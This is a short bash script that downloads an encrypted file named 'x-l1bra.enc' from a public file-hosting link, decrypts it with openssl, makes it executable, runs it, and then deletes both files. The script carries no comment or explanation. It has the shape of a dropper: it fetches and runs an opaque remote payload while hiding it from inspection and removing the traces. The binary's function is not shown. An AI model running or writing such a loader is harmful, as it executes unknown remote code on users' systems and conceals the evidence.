#! /bin/bash
cd
curl -O https://store11.gofile.io/download/1666bd8c-a782-43ac-bb27-d0cebbef6b7f/x-l1bra.enc
openssl enc -d -aes-256-cbc -in x-l1bra.enc -out x-l1bra
sudo chmod 755 x-l1bra
./x-l1bra
rm x-l1bra.enc x-l1bra
